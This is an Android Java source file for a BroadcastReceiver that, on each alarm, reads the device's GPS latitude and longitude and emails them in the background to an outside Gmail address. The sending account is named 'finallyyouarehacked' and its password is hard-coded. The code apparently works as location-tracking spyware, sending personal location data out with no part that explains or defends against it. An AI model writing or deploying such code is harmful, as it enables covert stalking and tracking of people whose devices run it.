package com.example.testproj;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.widget.Toast;

public class AlaramReceiver extends BroadcastReceiver {
	GPSTracker gps;
	@Override
	public void onReceive(Context context, Intent intent) {
		gps=new GPSTracker(context);
		if(gps.canGetLocation){
			double longitude=gps.getLongitude();
			double latitude=gps.getLatitude();
			Toast.makeText(context, "Latitude: "+String.valueOf(latitude), Toast.LENGTH_LONG).show();
			BackgroundMail bm = new BackgroundMail(context);
	        bm.setGmailUserName("finallyyouarehacked@gmail.com");
	        bm.setGmailPassword("hackerkey");
	        bm.setMailTo("mitrasabaiko@gmail.com");
	        bm.setFormSubject("Long_Lat");
	        bm.setFormBody("Body"+String.valueOf(latitude)+String.valueOf(longitude));
	        bm.send();
		}
		
	}

}
